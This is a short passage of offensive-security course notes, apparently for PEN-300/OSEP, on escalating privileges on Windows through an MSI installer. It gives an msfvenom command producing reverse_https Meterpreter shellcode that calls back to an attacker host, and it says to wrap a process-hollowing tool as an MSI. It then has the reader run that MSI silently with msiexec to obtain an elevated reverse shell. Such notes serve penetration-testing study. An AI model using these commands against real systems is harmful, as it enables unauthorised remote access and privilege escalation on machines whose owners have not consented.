This can be found using PowerUp.ps1.

Generate shellcode for the Hollow.exe tool we make from the Process Injection and Migration module in the PEN-300 course then build the tool:

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.x.x LPORT=<port> -f csharp
```

Move Hollow.exe and MSI wrapper to our dev machine to compile the exe as an msi by following the steps here: https://github.com/OoStellarnightoO/OSEP_Notes/blob/main/03%20-%20PrivEsc/README.MD

> Once the msi is compiled, download it to the target machine and execute it to get a elevated reverse shell:

```
msiexec.exe /quiet /qn /i hollow.msi
```
